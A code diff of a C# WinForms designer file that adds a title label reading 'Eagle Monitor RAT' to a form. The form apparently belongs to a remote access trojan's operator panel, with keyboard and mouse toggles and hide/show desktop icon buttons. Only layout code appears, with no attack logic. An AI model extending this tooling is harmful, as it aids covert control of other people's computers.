@@ -53,6 +53,7 @@
             this.keyboardGuna2ToggleSwitch = new Guna.UI2.WinForms.Guna2ToggleSwitch();
             this.label6 = new System.Windows.Forms.Label();
             this.mouseGuna2ToggleSwitch = new Guna.UI2.WinForms.Guna2ToggleSwitch();
+            this.label9 = new System.Windows.Forms.Label();
             this.guna2GroupBox2.SuspendLayout();
             this.guna2GroupBox1.SuspendLayout();
             this.guna2GroupBox3.SuspendLayout();
@@ -428,12 +429,24 @@
             this.mouseGuna2ToggleSwitch.UncheckedState.Parent = this.mouseGuna2ToggleSwitch;
             this.mouseGuna2ToggleSwitch.CheckedChanged += new System.EventHandler(this.mouseGuna2ToggleSwitch_CheckedChanged);
             // 
+            // label9
+            // 
+            this.label9.BackColor = System.Drawing.Color.Transparent;
+            this.label9.ForeColor = System.Drawing.Color.White;
+            this.label9.Location = new System.Drawing.Point(3, 0);
+            this.label9.Name = "label9";
+            this.label9.Size = new System.Drawing.Size(235, 32);
+            this.label9.TabIndex = 51;
+            this.label9.Text = "Eagle Monitor RAT";
+            this.label9.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
+            // 
             // MiscellaneousForm
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
             this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
             this.ClientSize = new System.Drawing.Size(591, 309);
+            this.Controls.Add(this.label9);
             this.Controls.Add(this.guna2GroupBox3);
             this.Controls.Add(this.guna2GroupBox2);
             this.Controls.Add(this.guna2GroupBox1);
@@ -446,7 +459,6 @@
             this.Name = "MiscellaneousForm";
             this.Padding = new System.Windows.Forms.Padding(3, 32, 3, 3);
             this.Text = "MiscellaneousForm";
-            this.Load += new System.EventHandler(this.MiscellaneousForm_Load);
             this.guna2GroupBox2.ResumeLayout(false);
             this.guna2GroupBox1.ResumeLayout(false);
             this.guna2GroupBox1.PerformLayout();
@@ -481,5 +493,6 @@
         private Guna.UI2.WinForms.Guna2Button hideDesktopIconsGuna2Button;
         private Guna.UI2.WinForms.Guna2Button showDesktopIconsGuna2Button;
         private System.Windows.Forms.Label label2;
+        public System.Windows.Forms.Label label9;
     }
 }
